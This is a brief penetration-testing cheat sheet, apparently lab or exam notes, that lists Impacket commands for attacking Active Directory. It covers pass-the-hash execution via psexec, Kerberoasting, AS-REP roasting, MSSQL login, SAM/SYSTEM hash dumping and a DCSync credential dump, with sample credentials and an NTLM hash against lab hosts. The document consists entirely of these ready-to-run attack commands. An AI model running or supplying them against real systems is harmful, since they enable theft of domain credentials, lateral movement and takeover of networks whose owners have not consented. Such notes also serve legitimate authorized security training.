
### IMPACKET-COLLECTION


psexec
```
impacket-psexec -hashes 00000000000000000000000000000000:2a944a58d4ffa77137b2c587e6ed7626 maria@10.10.10.20
```
Kerberos

```
impacket-GetUserSPNs corp.com/meg:'Passw0rd' -dc-ip 10.10.10.20 -outputfile hashes.kerb￼￼
```
AS-REP Roast

```￼￼
impacket-GetNPUsers corp.com/meg:'Passw0rd' -dc-ip 10.10.10.20 -outputfile dave.hash
```
Mssql
```￼
impacket-mssqlclient sequel.htb/rose:Passw0rd@10.10.10.20 -windows-auth
```
SAM&SYSTEM DUMP

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
DCsync ATTACK
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Passw0rd"@10.10.10.20
```
